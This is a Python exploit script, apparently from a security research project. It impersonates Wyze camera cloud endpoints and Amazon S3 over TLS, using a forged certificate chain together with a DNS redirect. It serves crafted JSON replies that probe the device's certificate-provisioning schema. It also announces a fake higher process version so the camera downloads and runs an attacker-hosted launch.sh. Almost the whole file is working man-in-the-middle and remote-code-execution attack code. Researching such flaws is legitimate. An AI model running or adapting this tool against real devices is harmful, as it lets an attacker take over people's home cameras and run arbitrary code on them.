#!/usr/bin/env python3
"""Serve the OTA payload over TLS with a forged chain the camera trusts.

Bind :443 (or --port), present deliverables/certs/emudhra/{leaf.pem,leaf.key} with the cross-signed
intermediate appended, and serve --dir. Prints the chain it will send so a failure is diagnosable.

The camera reaches this by name, so something must resolve the name to this host: either a DNS
answer for the SAN host (see docs/exploit/wyze-forged-chain.md) or the delta URL pointed at a name
that already resolves here.

  wyze_forge_serve.py --dir /tmp/fwserve --port 443 --sni s3-us-west-2.amazonaws.com
"""
import argparse, http.server, json, os, socket, ssl, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
CERTDIR = os.path.join(HERE, "..", "certs", "emudhra")


UP_HOST = "device-api.wyzecam.com"


def _up_ip(host=UP_HOST):
    """Resolve the real device API past our own DNS redirect."""
    import subprocess
    try:
        out = subprocess.run(["dig", "+short", "+time=2", "@1.1.1.1", host],
                             capture_output=True, text=True).stdout.split()
        for c in out:
            if c and c[0].isdigit():
                return c
    except Exception:
        pass
    return None


def passthrough(path, body, headers):
    """Forward an unimplemented call to the real cloud and return its bytes verbatim.

    The point is the *response schema*: the device asks for things we do not know how to answer
    (get_processes and friends), and the real answer is the specification.
    """
    host = (headers.get("Host") or UP_HOST).split(":")[0]
    ip = _up_ip(host)
    if not ip:
        return b'{"code":1,"message":"Success"}'
    try:
        raw = socket.create_connection((ip, 443), timeout=8)
        ctx = ssl.create_default_context()
        c = ctx.wrap_socket(raw, server_hostname=host)
        hdr = [f"POST {path} HTTP/1.1", f"Host: {host}",
               f"Content-Length: {len(body)}",
               "Content-Type: " + (headers.get("Content-Type") or "application/json"),
               "Connection: close"]
        for extra in ("X-Request-Id", "User-Agent", "Accept"):
            if headers.get(extra):
                hdr.append(f"{extra}: {headers.get(extra)}")
        c.sendall(("\r\n".join(hdr) + "\r\n\r\n").encode() + body)
        buf = b""
        while True:
            d = c.recv(65536)
            if not d:
                break
            buf += d
        c.close()
        head, _, payload = buf.partition(b"\r\n\r\n")
        print(f"  <- passthrough {len(payload)}B {payload[:4000]!r}", flush=True)
        return payload
    except Exception as e:
        print(f"  <- passthrough failed {e!r}", flush=True)
        return b'{"code":1,"message":"Success"}'


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/fwserve")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--cert", default=os.path.join(CERTDIR, "leaf.pem"))
    ap.add_argument("--key", default=os.path.join(CERTDIR, "leaf.key"))
    ap.add_argument("--intermediate", default=os.path.join(CERTDIR, "ev-ca-aaa-cross.pem"))
    ap.add_argument("--sni", default="s3-us-west-2.amazonaws.com", help="expected SNI, for the log")
    a = ap.parse_args()

    chain = os.path.join(CERTDIR, "serve.pem")
    # leaf FIRST: load_cert_chain treats the first certificate as the subject, the rest as chain
    with open(chain, "wb") as out:
        out.write(open(a.cert, "rb").read())
        out.write(open(a.intermediate, "rb").read())
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(chain, a.key)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *x, **kw):
            super().__init__(*x, directory=a.dir, **kw)

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n) if n else b""
            print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
                  f"POST {self.path} {body[:800]!r}", flush=True)
            if "get_processes" in self.path:
                print("  hdrs " + repr(dict(self.headers)), flush=True)
            if "get_iot_certificate" in self.path:
                # The stock client wants URLs, not inline PEM (EV-pack-H-002 §9.2). Each retry gets
                # the next envelope variant so the device itself walks the candidate list; the
                # accepted one is the variant after which it fetches the three URLs.
                base = "https://s3-us-west-2.amazonaws.com/fss"
                q = ("?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA%2F20261025%2Fus-west-2"
                     "%2Fs3%2Faws4_request&X-Amz-Date=20261025T000000Z&X-Amz-Expires=3600"
                     "&X-Amz-Signature=deadbeef")
                urls = {"ca_cert_url": base + "/rootCA.crt", "client_cert_url": base + "/cert.pem",
                        "client_private_key_url": base + "/privkey.pem"}
                pres = {k: v + q for k, v in urls.items()}
                ident = {"client_id": "80482c525905", "thing_name": "80482c525905", "keep_alive": 300}
                variants = [
                    ("int-code-msg", {"code": 1, "msg": "SUCCESS", "data": urls}),
                    ("str-code-msg", {"code": "1", "msg": "SUCCESS", "data": urls}),
                    ("int-code-message", {"code": 1, "message": "Success", "data": urls}),
                    ("int-code-msg-presigned", {"code": 1, "msg": "SUCCESS", "data": pres}),
                    ("int-code-msg-ident", {"code": 1, "msg": "SUCCESS", "data": {**urls, **ident}}),
                    ("root-cert-url", {"code": 1, "msg": "SUCCESS", "data": {
                        "root_cert_url": urls["ca_cert_url"], "client_cert_url": urls["client_cert_url"],
                        "client_private_key_url": urls["client_private_key_url"]}}),
                    ("bare-data", urls),
                    ("code-data-only", {"code": 1, "data": urls}),
                ]
                try:
                    i = int(open("/tmp/ota/cand_idx").read().strip())
                except Exception:
                    i = 0
                label, obj = variants[i % len(variants)]
                open("/tmp/ota/cand_idx", "w").write(str(i + 1))
                print(f"  -> variant[{i}] {label}", flush=True)
                out = json.dumps(obj).encode()
            elif ("get_processes" in self.path or "get_download_location" in self.path) \
                    and os.environ.get("PROC_ANSWER"):
                # Real schema, captured from the cloud: one process per request, keyed by the
                # processname the device sends, and the payload is a launch.sh. Answering with a
                # higher version makes the device fetch and run ours.
                try:
                    name = json.loads(body).get("processname") or "fss"
                except Exception:
                    name = "fss"
                out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
                                  "data": {"version": os.environ.get("PROC_VER", "99.0.0"),
                                           "url": "https://sinker-t-usw2.s3.us-west-2.amazonaws.com"
                                                  "/proc/launch.sh?processname=" + name}}).encode()
            elif os.environ.get("PASSTHROUGH"):
                out = passthrough(self.path, body, self.headers)
            else:
                out = b'{"code":1,"message":"Success"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, fmt, *args):
            # the device is distinguishable from a local probe only by its own UA
            print(f"{self.address_string()} ua={self.headers.get('User-Agent', '-')!r} " + (fmt % args),
                  flush=True)

    handler = Handler

    class Server(http.server.HTTPServer):
        allow_reuse_address = True

    srv = Server(("0.0.0.0", a.port), handler)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"serving {a.dir} on :{a.port}, expecting SNI {a.sni}, chain {chain}", flush=True)
    srv.serve_forever()
    return 0


if __name__ == "__main__":
    sys.exit(main())
